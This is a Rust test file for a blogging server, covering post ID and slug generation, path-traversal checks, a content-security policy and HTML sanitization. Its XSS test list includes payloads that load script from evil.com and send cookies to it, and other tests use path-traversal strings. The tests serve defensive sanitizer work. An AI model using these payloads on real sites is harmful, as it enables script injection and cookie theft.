use super::*;
use crate::template::TemplateEngine;
use std::collections::HashMap;

fn assert_unguessable_id(post_id: &str, slug: &str, date: &str) {
    let prefix = format!("{slug}-");
    assert!(
        post_id.starts_with(&prefix),
        "id {post_id} should start with {prefix}"
    );
    let after_slug = &post_id[prefix.len()..];
    let date_marker = format!("-{date}");
    let date_at = after_slug
        .find(&date_marker)
        .unwrap_or_else(|| panic!("id {post_id} should contain {date_marker}"));
    let random = &after_slug[..date_at];
    assert_eq!(random.len(), 32, "random segment in {post_id}");
    assert!(
        random.chars().all(|c| c.is_ascii_hexdigit()),
        "random segment {random} in {post_id}"
    );
    let rest = &after_slug[date_at + 1..];
    let collision = rest
        .strip_prefix(&format!("{date}-"))
        .is_some_and(|n| !n.is_empty() && n.chars().all(|c| c.is_ascii_digit()));
    assert!(rest == date || collision, "tail {rest} in {post_id}");
}

#[test]
fn test_post_id_generation() {
    let storage = PostCache::shared(128);
    let date_str = Utc::now().format("%m-%d-%Y").to_string();

    let id1 = generate_post_id("Hello World", &storage).unwrap();
    assert_unguessable_id(&id1, "hello-world", &date_str);

    // Test with special characters
    let id2 = generate_post_id("Hello, World! & More", &storage).unwrap();
    assert_unguessable_id(&id2, "hello-world-more", &date_str);
    assert_ne!(id1, id2);
}

#[test]
fn test_is_valid_post_id_accepts_generated_ids() {
    // Slugs produced by generate_post_id and the static pages.
    assert!(is_valid_post_id("hello-world-09-01-2026"));
    assert!(is_valid_post_id("hello-world-09-01-2026-3"));
    assert!(is_valid_post_id(
        "hello-world-0123456789abcdef0123456789abcdef-09-01-2026"
    ));
    assert!(is_valid_post_id("na-ab12-09-01-2026"));
    assert!(is_valid_post_id(
        "na-ab12-0123456789abcdef0123456789abcdef-09-01-2026"
    ));
    assert!(is_valid_post_id("about"));
    // Telegraph archiver slugs may contain uppercase and underscores.
    assert!(is_valid_post_id("Sample-Page-12-15"));
    assert!(is_valid_post_id("some_post_1"));
}

#[test]
fn test_is_valid_post_id_rejects_traversal() {
    // Path separators and dot segments must never be accepted, in any
    // form the router can deliver after percent-decoding.
    assert!(!is_valid_post_id(""));
    assert!(!is_valid_post_id(".."));
    assert!(!is_valid_post_id("../README"));
    assert!(!is_valid_post_id("../../etc/passwd"));
    assert!(!is_valid_post_id("..\\README"));
    assert!(!is_valid_post_id("foo/bar"));
    assert!(!is_valid_post_id("foo.bar"));
    assert!(!is_valid_post_id("post.md"));
    assert!(!is_valid_post_id("a b"));
    assert!(!is_valid_post_id("post\0"));
}

#[test]
fn csp_lets_the_tab_talk_to_public_relays() {
    let policy = content_security_policy(&[
        "wss://relay.damus.io".to_string(),
        "wss://127.0.0.1".to_string(),
        "wss://nos.lol".to_string(),
    ]);
    assert!(policy.contains("connect-src 'self' wss://relay.damus.io wss://nos.lol;"));
    assert!(!policy.contains("127.0.0.1"));
    assert!(policy.contains("default-src 'self'"));
}

#[test]
fn csp_without_public_relays_stays_on_this_host() {
    let policy = content_security_policy(&["wss://localhost".to_string()]);
    assert!(policy.contains("connect-src 'self';"));
    assert!(!policy.contains("localhost"));
}

#[test]
fn nostr_identifier_is_nevent_or_naddr() {
    assert!(is_nostr_identifier("nevent1abc"));
    assert!(is_nostr_identifier("naddr1xyz"));
    assert!(!is_nostr_identifier("nsec1abc"));
    assert!(!is_nostr_identifier("hello-world"));
    assert!(!is_nostr_identifier("nevent1"));
    assert!(!is_nostr_identifier("nevent1abc/../x"));
    assert!(!is_nostr_identifier(""));
}

#[test]
fn test_is_valid_post_id_length_bound() {
    let at_limit = "a".repeat(MAX_POST_ID_LEN);
    let over_limit = "a".repeat(MAX_POST_ID_LEN + 1);
    assert!(is_valid_post_id(&at_limit));
    assert!(!is_valid_post_id(&over_limit));
}

#[test]
fn test_generated_ids_are_always_valid() {
    // Every id generate_post_id can emit must pass the read-path guard,
    // otherwise a freshly created post would 404. These titles exercise
    // each slug branch: a normal slug, the symbol-only and whitespace-only
    // fallbacks ("na-XXXX"), and the long-title truncation ("-etc").
    let storage = PostCache::shared(128);
    for title in [
        "Hello World",
        "Special!@#$%Characters",
        "!@#$%^&*()",
        "   ",
        &"very long title ".repeat(40),
    ] {
        let id = generate_post_id(title, &storage).unwrap();
        assert!(
            is_valid_post_id(&id),
            "generated id {:?} rejected by is_valid_post_id",
            id
        );
    }
}

#[test]
fn test_markdown_rendering_basic() {
    let input = "This is *bold* text and **italic** text.";
    let output = parser::render_markdown(input);
    // Basic test - the actual implementation needs proper regex
    assert!(output.contains("bold"));
    assert!(output.contains("italic"));
}

#[test]
fn test_content_length_validation() {
    let short_content = "a".repeat(100);
    let long_content = "a".repeat(35000);

    assert!(short_content.len() <= 32000);
    assert!(long_content.len() > 32000);
}

#[test]
fn test_template_engine_basic() {
    use std::fs;
    use tempfile::tempdir;

    let dir = tempdir().unwrap();
    let template_content = "<h1>{{title}}</h1><p>{{content}}</p>";
    fs::write(dir.path().join("test.html"), template_content).unwrap();

    let engine = TemplateEngine::new(dir.path().to_str().unwrap());
    let mut context = HashMap::new();
    context.insert("title".to_string(), "Test Title".to_string());
    context.insert("content".to_string(), "Test content".to_string());

    let result = engine.render("test", &context).unwrap();
    assert_eq!(result, "<h1>Test Title</h1><p>Test content</p>");
}

#[test]
fn test_slug_generation() {
    let tests = vec![
        ("Hello World", "hello-world"),
        ("Test-Post_123", "test-post-123"),
        ("Special!@#$%Characters", "specialcharacters"),
        ("   Whitespace   ", "whitespace"),
        ("Multiple---Dashes", "multiple-dashes"),
    ];

    for (input, expected) in tests {
        let slug: String = input
            .trim()
            .to_lowercase()
            .chars()
            .filter_map(|c| {
                if c.is_ascii_alphanumeric() {
                    Some(c)
                } else if c.is_whitespace() || c == '-' || c == '_' {
                    Some('-')
                } else {
                    None
                }
            })
            .collect::<String>()
            .split('-')
            .filter(|s| !s.is_empty())
            .collect::<Vec<&str>>()
            .join("-");

        assert_eq!(slug, expected);
    }
}

#[test]
fn test_markdown_bold_formatting() {
    let input = "This is **bold** text and more **bold text**.";
    let output = parser::render_markdown(input);
    assert!(output.contains("<strong>bold</strong>"));
    assert!(output.contains("<strong>bold text</strong>"));
}

#[test]
fn test_markdown_code_formatting() {
    let input = "Here is `inline code` and more `code`.";
    let output = parser::render_markdown(input);
    // Note: Our current simple implementation doesn't handle this yet
    // This test documents expected behavior
    assert!(output.contains("inline code"));
}

#[test]
fn test_content_sanitization() {
    let malicious_content = "<script>alert('xss')</script>";
    let sanitized = ammonia::clean(malicious_content);
    assert!(!sanitized.contains("<script>"));
    assert!(!sanitized.contains("alert"));
}

#[test]
fn test_title_and_author_sanitization() {
    let malicious_title = "<script>alert('xss')</script>Safe Title";
    let sanitized_title = parser::sanitize_text(&malicious_title);
    assert_eq!(sanitized_title, "Safe Title");

    let malicious_author = "<b>Bold</b><script>alert('xss')</script>John Doe";
    let sanitized_author = parser::sanitize_text(&malicious_author);
    assert_eq!(sanitized_author, "BoldJohn Doe");

    let clean_text = "Normal Title";
    let sanitized_clean = parser::sanitize_text(&clean_text);
    assert_eq!(sanitized_clean, "Normal Title");

    let various_tags = "<h1>Title</h1><p>Content</p><script>alert('xss')</script>";
    let sanitized_various = parser::sanitize_text(&various_tags);
    assert_eq!(sanitized_various, "TitleContent");
}

#[test]
fn test_xss_attack_vectors() {
    let xss_test_cases = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script src='http://evil.com/xss.js'></script>",
        "<script>console.log('test')</script>",
        "<SCRIPT>alert('XSS')</SCRIPT>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>fetch('//evil.com?c='+document.cookie)</script>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<script>alert`1`</script>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<img src='x' onerror='alert(1)'>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<img/src='x'/onerror='alert(1)'>",
        "<img src=x:alert(1) onerror=eval(src)>",
        "<img src='x' onerror='javascript:alert(1)'>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<img src=`x` onerror=alert(1)>",
        "<img src=x a='' onerror=alert(1)>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<iframe onload=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<div onmouseover=alert(1)>test</div>",
        "<button onclick=alert(1)>Click</button>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1)>",
        "<svg><a xlink:href='javascript:alert(1)'><text>XSS</text></a></svg>",
        "<math><mtext></mtext><script>alert(1)</script></math>",
        "<form><button formaction=javascript:alert(1)>Click",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "<iframe src='javascript:alert(1)'>",
        "<link rel='stylesheet' href='javascript:alert(1)'>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>\u{0061}lert(1)</script>",
        "<script>ale\u{0072}t(1)</script>",
        "javascript:alert(1)",
        "javascript&#58;alert(1)",
        "javascript&#x3A;alert(1)",
        "<a href='javascript:alert(1)'>Click</a>",
        "<a href='jav&#x09;ascript:alert(1)'>Click</a>",
        "<img src='x' onerror='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;'>",
    ];

    for (i, xss_payload) in xss_test_cases.iter().enumerate() {
        let sanitized = parser::sanitize_text(xss_payload);
        let lower = sanitized.to_lowercase();
        assert!(
            !lower.contains("<script"),
            "Test case {}: contains <script: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onerror"),
            "Test case {}: contains onerror: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onload"),
            "Test case {}: contains onload: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onclick"),
            "Test case {}: contains onclick: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onfocus"),
            "Test case {}: contains onfocus: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("onmouseover"),
            "Test case {}: contains onmouseover: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("<iframe"),
            "Test case {}: contains <iframe: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("<img"),
            "Test case {}: contains <img: {}",
            i + 1,
            sanitized
        );
        assert!(
            !lower.contains("<svg"),
            "Test case {}: contains <svg: {}",
            i + 1,
            sanitized
        );
    }

    let mixed_payload = "Hello <script>alert('XSS')</script> World";
    let sanitized_mixed = parser::sanitize_text(&mixed_payload);
    assert_eq!(sanitized_mixed, "Hello  World");

    let title_with_xss = "My Blog Post <img src=x onerror=alert(1)>";
    let sanitized_title = parser::sanitize_text(&title_with_xss);
    assert_eq!(sanitized_title, "My Blog Post ");

    let dangerous_payloads = [
        ("<script>alert('XSS')</script>", ""),
        ("<img src=x onerror=alert(1)>", ""),
        ("Safe Title <script>evil()</script>", "Safe Title "),
        ("<svg onload=alert(1)>", ""),
        ("Author <iframe src='javascript:alert(1)'>", "Author "),
        (
            "This is a very long title that should be truncated",
            "This is a very long title that should be truncated",
        ),
    ];

    for (payload, expected) in dangerous_payloads {
        let result = parser::sanitize_text(payload);
        assert_eq!(result, expected, "Failed for payload: {}", payload);
    }
}

#[test]
fn test_post_creation_sanitization_integration() {
    let storage = PostCache::shared(128);
    let malicious_title = "<script>alert('xss')</script>Clean Title";
    let malicious_author = "<b>Bold</b><img src=x>Author";
    let clean_content = "This is safe content";

    let post_id = generate_post_id("clean-fallback", &storage).unwrap();
    let rendered_content = parser::render_markdown(clean_content);

    let post = Post {
        id: post_id.clone(),
        title: parser::sanitize_text(&malicious_title),
        author: parser::sanitize_text(&malicious_author),
        content: rendered_content,
        raw_content: clean_content.to_string(),
        created_at: Utc::now(),
        nostr_id: None,
    };

    assert_eq!(post.title, "Clean Title");
    assert_eq!(post.author, "BoldAuthor");
}

#[test]
fn test_post_id_collision_handling() {
    let dir = tempfile::tempdir().unwrap();
    let base = dir.path().to_str().unwrap();
    let now = Utc::now();
    let date_str = now.format("%m-%d-%Y").to_string();
    let id = format!("test-0123456789abcdef0123456789abcdef-{date_str}");

    let first = Post {
        id: id.clone(),
        title: "Test".to_string(),
        author: "Test Author".to_string(),
        content: "Content".to_string(),
        raw_content: "first body".to_string(),
        created_at: now,
        nostr_id: None,
    };
    save::save_post_to_file_in_dir(&first, base).unwrap();
    let path = dir.path().join("content").join(format!("{id}.md"));
    let first_bytes = std::fs::read(&path).unwrap();

    let second = Post {
        raw_content: "second body".to_string(),
        ..first
    };
    assert!(save::save_post_to_file_in_dir(&second, base).is_err());
    assert_eq!(std::fs::read(&path).unwrap(), first_bytes);
}

fn insert_cached_post(storage: &PostStorage, id: &str) {
    let post = Post {
        id: id.to_string(),
        title: "Test".to_string(),
        author: String::new(),
        content: "Content".to_string(),
        raw_content: "Content".to_string(),
        created_at: Utc::now(),
        nostr_id: None,
    };
    storage
        .write()
        .unwrap()
        .insert(id.to_string(), Arc::new(post));
}

#[test]
fn test_same_title_gets_a_different_random_segment() {
    let storage = PostCache::shared(128);
    let date_str = Utc::now().format("%m-%d-%Y").to_string();

    let first = generate_post_id("Hello World", &storage).unwrap();
    let second = generate_post_id("Hello World", &storage).unwrap();
    assert_unguessable_id(&first, "hello-world", &date_str);
    assert_unguessable_id(&second, "hello-world", &date_str);
    assert_ne!(first, second);
    assert_ne!(first, format!("hello-world-{date_str}"));
    assert_ne!(second, format!("hello-world-{date_str}"));
}

#[test]
fn test_empty_title_ids_differ() {
    let storage = PostCache::shared(128);
    let date_str = Utc::now().format("%m-%d-%Y").to_string();

    let first = generate_post_id("", &storage).unwrap();
    let second = generate_post_id("   ", &storage).unwrap();
    assert_ne!(first, second);
    for post_id in [&first, &second] {
        let short = &post_id[3..7];
        assert_unguessable_id(post_id, &format!("na-{short}"), &date_str);
    }
}

#[test]
fn test_cached_exact_id_takes_the_next_suffix() {
    let storage = PostCache::shared(128);
    let date_str = Utc::now().format("%m-%d-%Y").to_string();
    let random = "0123456789abcdef0123456789abcdef";

    insert_cached_post(&storage, &assemble_post_id("other", random, &date_str, 0));
    let open = generate_post_id_with_segment("Test", &storage, random).unwrap();
    assert_eq!(open, assemble_post_id("test", random, &date_str, 0));

    insert_cached_post(&storage, &open);
    let next = generate_post_id_with_segment("Test", &storage, random).unwrap();
    assert_eq!(next, assemble_post_id("test", random, &date_str, 1));

    insert_cached_post(&storage, &next);
    let after = generate_post_id_with_segment("Test", &storage, random).unwrap();
    assert_eq!(after, assemble_post_id("test", random, &date_str, 2));
}

#[test]
fn test_cached_id_slots_exhausted() {
    let storage = PostCache::shared(128);
    let date_str = Utc::now().format("%m-%d-%Y").to_string();
    let random = "fedcba9876543210fedcba9876543210";

    for index in 0..1000 {
        insert_cached_post(
            &storage,
            &assemble_post_id("test", random, &date_str, index),
        );
    }

    let err = generate_post_id_with_segment("Test", &storage, random).unwrap_err();
    assert!(err.contains("choose another title"), "{err}");
}

#[test]
fn test_max_length_id_stays_within_path_limit() {
    let storage = PostCache::shared(128);
    let date_str = Utc::now().format("%m-%d-%Y").to_string();
    let long_title = "word ".repeat(80);
    let id = generate_post_id(&long_title, &storage).unwrap();
    assert!(id.len() <= 250, "id length {}", id.len());
    assert!(is_valid_post_id(&id));

    let max_slug = 250 - date_str.len() - 1 - 33;
    let packed = assemble_post_id(
        &"a".repeat(max_slug),
        "0123456789abcdef0123456789abcdef",
        &date_str,
        999,
    );
    assert!(
        packed.len() <= MAX_POST_ID_LEN,
        "packed length {}",
        packed.len()
    );
    assert!(is_valid_post_id(&packed));
}

#[test]
fn test_different_ids_save_side_by_side() {
    let dir = tempfile::tempdir().unwrap();
    let base = dir.path().to_str().unwrap();
    let now = Utc::now();
    let mk = |id: &str, body: &str| Post {
        id: id.to_string(),
        title: "Test".to_string(),
        author: String::new(),
        content: body.to_string(),
        raw_content: body.to_string(),
        created_at: now,
        nostr_id: None,
    };

    let first_id = "alpha-0123456789abcdef0123456789abcdef-09-28-2026";
    let second_id = "beta-fedcba9876543210fedcba9876543210-09-28-2026";
    save::save_post_to_file_in_dir(&mk(first_id, "first body"), base).unwrap();
    save::save_post_to_file_in_dir(&mk(second_id, "second body"), base).unwrap();

    let read = |id: &str| {
        std::fs::read_to_string(dir.path().join("content").join(format!("{id}.md"))).unwrap()
    };
    assert!(read(first_id).contains("first body"));
    assert!(read(second_id).contains("second body"));
}

#[test]
fn test_url_safe_slug_generation() {
    let test_cases = vec![
        ("Hello/World", "helloworld"),
        ("Test\\Post", "testpost"),
        ("Question?", "question"),
        ("Exclamation!", "exclamation"),
        ("At@Symbol", "atsymbol"),
        ("Hash#Tag", "hashtag"),
        ("Dollar$Sign", "dollarsign"),
        ("Percent%Sign", "percentsign"),
    ];

    for (input, expected) in test_cases {
        let slug: String = input
            .trim()
            .to_lowercase()
            .chars()
            .filter_map(|c| {
                if c.is_ascii_alphanumeric() {
                    Some(c)
                } else if c.is_whitespace() || c == '-' || c == '_' {
                    Some('-')
                } else {
                    None
                }
            })
            .collect::<String>()
            .split('-')
            .filter(|s| !s.is_empty())
            .collect::<Vec<&str>>()
            .join("-");

        assert_eq!(slug, expected, "Failed for input: {}", input);
    }
}

#[test]
fn test_character_limits() {
    // Test title length limit
    let long_title = "a".repeat(150);
    assert!(long_title.len() > 128);

    // Test content length limit
    let long_content = "a".repeat(130000);
    assert!(long_content.len() > 128000);

    // Test valid lengths
    let valid_title = "a".repeat(50);
    let valid_content = "a".repeat(50000);
    assert!(valid_title.len() <= 128);
    assert!(valid_content.len() <= 128000);
}

#[test]
fn test_emoji_handling() {
    let storage = PostCache::shared(128);

    let emoji_title = "🍆 Test Post with Emojis 🎉";
    let emoji_content = "🌟 ".repeat(80) + "This is content with lots of emojis! 🎯🔥💯";

    let post_id = generate_post_id(emoji_title, &storage).unwrap();
    assert!(!post_id.is_empty());

    let post = Post {
        id: post_id.clone(),
        title: emoji_title.to_string(),
        author: "🍆".to_string(),
        content: parser::render_markdown(&emoji_content),
        raw_content: emoji_content.clone(),
        created_at: Utc::now(),
        nostr_id: None,
    };

    let description = pages::post_description(&post.raw_content);

    assert!(description.len() <= emoji_content.len());
    assert!(!description.is_empty());

    let char_count = description.chars().count();
    if emoji_content.chars().count() > 160 {
        assert!(char_count <= 163);
    }
}

#[test]
fn test_emoji_parsing_edge_cases() {
    let emoji_content = "🎯";
    let _result = parser::render_markdown(emoji_content);

    let empty_content = "";
    let _empty_result = parser::render_markdown(empty_content);

    let single_char = "A";
    let single_result = parser::render_markdown(single_char);
    assert!(single_result.contains("A"));

    let boundary_content = "AB";
    let boundary_result = parser::render_markdown(boundary_content);
    assert!(boundary_result.contains("AB"));

    let storage = PostCache::shared(128);
    let emoji_title = "🎯";
    let result = generate_post_id(emoji_title, &storage);
    assert!(result.is_ok());

    let mixed_title = "Hello 🎯 World";
    let mixed_result = generate_post_id(mixed_title, &storage);
    assert!(mixed_result.is_ok());
}

#[test]
fn test_chinese_characters_transliteration() {
    let storage = PostCache::shared(128);

    // Test Chinese characters get transliterated
    let chinese_title = "李琴峰";
    let result = generate_post_id(chinese_title, &storage);
    assert!(result.is_ok());

    let post_id = result.unwrap();
    let date_str = Utc::now().format("%m-%d-%Y").to_string();

    // Should be transliterated, not use fallback
    assert!(!post_id.starts_with("na-"));
    assert!(post_id.ends_with(&format!("-{}", date_str)));

    // Chinese should transliterate to something like "li-qin-feng"
    assert!(post_id.contains("li"));

    // Test mixed Chinese and English
    let mixed_chinese = "Hello 李琴峰 World";
    let mixed_result = generate_post_id(mixed_chinese, &storage);
    assert!(mixed_result.is_ok());
    let mixed_id = mixed_result.unwrap();

    // Should not use fallback, should be transliterated
    assert!(!mixed_id.starts_with("na-"));
    assert!(mixed_id.contains("hello"));
    assert!(mixed_id.contains("world"));
    assert!(mixed_id.ends_with(&format!("-{}", date_str)));
}

#[test]
fn test_unicode_languages_transliteration() {
    let storage = PostCache::shared(128);

    // Test various unicode languages and scripts get transliterated
    let test_cases = vec![
        // Mostly English with some unicode - should be transliterated
        ("Hello World with émojis 🎉", "hello-world-with-emojis-tada"),
        ("Café & Naïve résumé", "cafe-naive-resume"), // French accents should be transliterated
        // German with umlauts - should be transliterated
        ("Schöne Grüße aus München", "schone-grusse-aus-munchen"),
        ("Die Brüder Müller", "die-bruder-muller"),
        // Pure ASCII (should work normally)
        ("Regular English Title", "regular-english-title"),
        ("Simple ASCII 123", "simple-ascii-123"),
    ];

    for (title, expected_slug) in test_cases {
        let result = generate_post_id(title, &storage);
        assert!(result.is_ok(), "Failed to generate ID for: {}", title);

        let post_id = result.unwrap();
        let date_str = Utc::now().format("%m-%d-%Y").to_string();
        assert_unguessable_id(&post_id, expected_slug, &date_str);
    }

    // Test languages that might not transliterate well - just verify they don't use na- fallback
    let complex_cases = vec![
        "李琴峰",           // Chinese
        "中文标题测试",     // More Chinese
        "こんにちは世界",   // Japanese Hiragana
        "カタカナテスト",   // Japanese Katakana
        "日本語のタイトル", // Japanese mixed
        "안녕하세요",       // Korean
        "한국어 제목",      // Korean with space
        "مرحبا بالعالم",    // Arabic
        "Привет мир",       // Russian Cyrillic
        "Hello 世界 Мир",   // Mixed scripts
    ];

    for title in complex_cases {
        let result = generate_post_id(title, &storage);
        assert!(result.is_ok(), "Failed to generate ID for: {}", title);

        let post_id = result.unwrap();
        // Should not use na- fallback anymore, should be transliterated
        assert!(
            !post_id.starts_with("na-"),
            "Title '{}' should be transliterated, not use na- fallback. Got: {}",
            title,
            post_id
        );

        // Should end with date
        let date_str = Utc::now().format("%m-%d-%Y").to_string();
        assert!(
            post_id.ends_with(&format!("-{}", date_str)),
            "Title '{}' should end with date. Got: {}",
            title,
            post_id
        );
    }
}

#[test]
fn test_unicode_transliteration() {
    let storage = PostCache::shared(128);

    // Test transliteration of various Unicode characters
    let test_cases = vec![
        // Pure ASCII should work normally
        ("Hello World 123", "hello-world-123"),
        ("Test-Post_With-Underscores", "test-post-with-underscores"),
        ("Simple ASCII Only", "simple-ascii-only"),
        // Non-ASCII should be transliterated
        ("Hello Wörld", "hello-world"), // German umlaut ö -> o
        ("Café", "cafe"),               // French accent é -> e
        ("résumé", "resume"),           // Multiple accents -> e
        ("naïve", "naive"),             // Diaeresis ï -> i
        ("España", "espana"),           // Spanish ñ -> n
        ("Zürich", "zurich"),           // German ü -> u
        ("François", "francois"),       // French ç -> c
        ("Москва", "moskva"),           // Russian -> latin
        ("北京", "bei-jing"),           // Chinese -> pinyin
        ("東京", "dong-jing"),          // Japanese -> latin
        ("©™® Test", "ctmr-test"), // Symbols get transliterated: © -> (c), ™ -> tm, ® -> (r) -> ctmr
        ("Test © 2024", "test-c-2024"), // Copyright symbol -> c
    ];

    for (title, expected_slug) in test_cases {
        let result = generate_post_id(title, &storage);
        assert!(result.is_ok(), "Failed to generate ID for: {}", title);

        let post_id = result.unwrap();
        let date_str = Utc::now().format("%m-%d-%Y").to_string();
        assert_unguessable_id(&post_id, expected_slug, &date_str);
    }

    // Test cases that should still use na- fallback (only for empty slugs)
    let fallback_cases = vec![
        "",    // Empty string
        "   ", // Only whitespace
        "!!!", // Only punctuation that doesn't transliterate
    ];

    let date_str = Utc::now().format("%m-%d-%Y").to_string();
    for title in fallback_cases {
        let result = generate_post_id(title, &storage);
        assert!(result.is_ok(), "Failed to generate ID for: '{}'", title);

        let post_id = result.unwrap();
        assert!(
            post_id.starts_with("na-"),
            "Title '{}' should use na- fallback but got: {}",
            title,
            post_id
        );
        let short = &post_id[3..7];
        assert!(
            short.chars().all(|c| c.is_ascii_alphanumeric()),
            "na- suffix in {post_id}"
        );
        assert_unguessable_id(&post_id, &format!("na-{short}"), &date_str);
    }
}

#[test]
fn test_title_truncation_with_etc_marker() {
    let storage = PostCache::shared(128);

    // Test long transliterated title gets truncated with etc marker
    let long_title = "🍆".repeat(100); // 100 eggplant emojis
    let result = generate_post_id(&long_title, &storage);
    assert!(result.is_ok());

    let post_id = result.unwrap();
    let date_str = Utc::now().format("%m-%d-%Y").to_string();

    // Should end with etc marker before date
    assert!(post_id.contains("-etc-"));
    assert!(post_id.ends_with(&format!("-{}", date_str)));

    // Total length should not exceed 250 characters
    assert!(post_id.len() <= 250);

    // Should contain "eggplant" repeated multiple times before "etc"
    assert!(post_id.contains("eggplant"));

    // Test with a very long Chinese title
    let long_chinese = "学习编程".repeat(50); // Repeat "learn programming" 50 times
    let chinese_result = generate_post_id(&long_chinese, &storage);
    assert!(chinese_result.is_ok());

    let chinese_id = chinese_result.unwrap();
    assert!(chinese_id.contains("-etc-"));
    assert!(chinese_id.len() <= 250);
    assert!(chinese_id.contains("xue-xi-bian-cheng"));

    // Test edge case where title is exactly at limit (should not truncate)
    let medium_title = "Short Title Test";
    let medium_result = generate_post_id(medium_title, &storage);
    assert!(medium_result.is_ok());

    let medium_id = medium_result.unwrap();
    assert!(!medium_id.contains("-etc-"));
    assert_unguessable_id(&medium_id, "short-title-test", &date_str);

    // Test very short title that would become empty after truncation
    let symbol_title = "©™®".repeat(200);
    let symbol_result = generate_post_id(&symbol_title, &storage);
    assert!(symbol_result.is_ok());

    let symbol_id = symbol_result.unwrap();
    // Should truncate with etc or use fallback if too short
    assert!(symbol_id.len() <= 250);
}

#[test]
fn test_deunicode_processes_all_titles() {
    let storage = PostCache::shared(128);

    // Test that deunicode is applied to ALL titles, not just non-ASCII
    let test_cases = vec![
        // Pure ASCII - should pass through unchanged
        ("Hello World", "hello-world"),
        ("Test 123", "test-123"),
        ("Simple Title", "simple-title"),
        // ASCII with symbols that deunicode might transform
        ("Test & Company", "test-company"), // & might be processed
        ("Price $100", "price-100"),        // $ might be processed
        // Mixed ASCII and potential edge cases
        ("API v2.0", "api-v20"),              // periods should be removed
        ("C++ Programming", "c-programming"), // ++ should be removed
    ];

    for (title, expected_slug) in test_cases {
        let result = generate_post_id(title, &storage);
        assert!(result.is_ok(), "Failed to generate ID for: {}", title);

        let post_id = result.unwrap();
        let date_str = Utc::now().format("%m-%d-%Y").to_string();
        assert_unguessable_id(&post_id, expected_slug, &date_str);
    }

    // Verify that deunicode is consistently applied by checking edge cases
    // where someone might try to bypass processing
    let edge_cases = vec![
        "Regular ASCII Title",
        "   Spaces   Around   ",
        "UPPERCASE TITLE",
        "MiXeD cAsE tItLe",
    ];

    for title in edge_cases {
        let result = generate_post_id(title, &storage);
        assert!(
            result.is_ok(),
            "Failed to generate ID for edge case: '{}'",
            title
        );

        let post_id = result.unwrap();
        // Should not contain any uppercase or unusual spacing
        assert!(
            !post_id.chars().any(|c| c.is_uppercase()),
            "Post ID should be lowercase: '{}'",
            post_id
        );
        assert!(
            !post_id.contains("  "),
            "Post ID should not have double spaces: '{}'",
            post_id
        );
    }
}

#[test]
fn test_bypass_prevention() {
    let storage = PostCache::shared(128);

    // Test that it's impossible to bypass deunicode processing
    // All these attempts should be safely processed
    let bypass_attempts = vec![
        // Try to use problematic characters that might break URLs
        ("Test\u{200B}Title", "test-title"), // Zero-width space becomes space
        ("Test\u{FEFF}Title", "testtitle"),  // Byte order mark disappears
        ("Test\u{00A0}Title", "test-title"), // Non-breaking space becomes space
        ("Test\u{2028}Title", "test-title"), // Line separator becomes space
        ("Test\u{2029}Title", "test-title"), // Paragraph separator becomes space
        // Try Unicode normalization edge cases
        ("café", "cafe"),         // é as single character
        ("cafe\u{0301}", "cafe"), // e + combining acute accent
        // Try right-to-left and bidirectional text
        ("Test\u{202E}Title", "testtitle"), // Right-to-left override disappears
        ("Test\u{202D}Title", "testtitle"), // Left-to-right override disappears
        // Try various Unicode categories
        ("\u{1F4A9}Test", "poop-test"),                 // Emoji
        ("\u{26A0}\u{FE0F}Warning", "warning-warning"), // Warning symbol
        // Try combining characters
        ("A\u{0300}\u{0301}\u{0302}Test", "atest"), // A with multiple accents
    ];

    for (malicious_title, expected_slug) in bypass_attempts {
        let result = generate_post_id(malicious_title, &storage);
        assert!(
            result.is_ok(),
            "Failed to process potentially malicious title: '{}'",
            malicious_title
        );

        let post_id = result.unwrap();
        let date_str = Utc::now().format("%m-%d-%Y").to_string();
        assert_unguessable_id(&post_id, expected_slug, &date_str);

        // Ensure the result is safe for URLs
        assert!(
            post_id
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-'),
            "Post ID contains unsafe characters: '{}'",
            post_id
        );
    }
}

#[test]
fn test_truncation_with_200_characters() {
    let emoji_content = "🎯".repeat(200);
    assert_eq!(emoji_content.chars().count(), 200);

    let description = pages::post_description(&emoji_content);

    assert_eq!(description.chars().count(), 163);
    assert!(description.ends_with("..."));
    assert!(description.starts_with("🎯"));

    let random_content = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".repeat(4);
    let random_content = &random_content[..200];
    assert_eq!(random_content.chars().count(), 200);

    let description2 = pages::post_description(random_content);

    assert_eq!(description2.chars().count(), 163);
    assert!(description2.ends_with("..."));

    let short_content = "🌟".repeat(50);
    assert_eq!(short_content.chars().count(), 50);

    let description3 = pages::post_description(&short_content);

    assert_eq!(description3.chars().count(), 50);
    assert!(!description3.ends_with("..."));
}

#[test]
fn test_date_parsing_from_file() {
    // Test legacy format parsing
    let file_content = "January 15, 2024 | Test Author\n\n# Test Post\nThis is test content";
    let result = parse_legacy_frontmatter(file_content).unwrap();
    let (title, author, created_at, raw_content) = result;

    assert_eq!(title, "Test Post");
    assert_eq!(author, "Test Author");
    assert_eq!(
